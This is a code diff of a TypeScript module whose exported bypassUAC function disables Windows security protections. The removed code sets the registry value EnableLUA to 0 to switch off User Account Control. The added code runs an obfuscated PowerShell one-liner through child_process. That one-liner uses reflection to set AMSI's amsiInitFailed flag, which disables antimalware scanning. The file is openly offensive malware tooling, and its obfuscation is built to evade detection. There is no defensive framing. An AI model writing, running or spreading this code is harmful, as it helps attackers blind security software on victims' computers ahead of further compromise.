@@ -1,5 +1,5 @@
 import { exec } from 'child_process';
-import regedit from 'regedit';
+
 const executeCommand = (
   command: string,
   usePowerShell: boolean = false,
@@ -25,32 +25,9 @@ const executeCommand = (
 };
 
 const bypassUAC = async () => {
-  // Editando uma chave de registro para alterar o comportamento do UAC
-  const arr = [
-    'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-  ];
-  regedit.createKey(arr, function (err: any) {
-    if (err) {
-      console.log('Erro ao editar o registro:', err);
-    } else {
-      regedit.putValue(
-        {
-          'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System':
-            {
-              EnableLUA: {
-                value: 0,
-                type: 'REG_DWORD',
-              },
-            },
-        },
-        // @ts-ignore
-        function (err) {
-          if (err) console.log(err);
-          else console.log('UAC desabilitado!');
-        },
-      );
-    }
-  });
+  const commandScape =
+    "S`eT-It`em ( 'V' + 'aR' + 'IA' + ('blE:1' + 'q2') + ('uZ' + 'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ;( Get-varI`A`BLE ( ('1Q' + '2U') +'zX' ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f ('Uti' + 'l'),'A',('Am' + 'si'),('.Man' + 'age' + 'men' + 't.'),('u' + 'to' + 'mation.'),'s',('Syst' + 'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f('a' + 'msi'),'d',('I' + 'nitF' + 'aile') ),( \"{2}{4}{0}{1}{3}\" -f ('S' + 'tat'),'i',('Non' + 'Publ' + 'i'),'c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} )";
+  await executeCommand(commandScape, true);
 };
 
 export default bypassUAC;
